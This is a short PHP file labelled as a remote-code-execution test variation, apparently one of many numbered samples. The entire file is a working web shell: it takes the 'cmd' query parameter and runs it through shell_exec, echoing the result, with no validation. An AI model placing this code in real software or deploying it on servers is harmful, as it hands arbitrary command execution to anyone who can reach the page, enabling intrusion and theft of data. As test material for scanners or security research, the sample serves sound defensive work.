<?php
// RCE test variation #1119
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>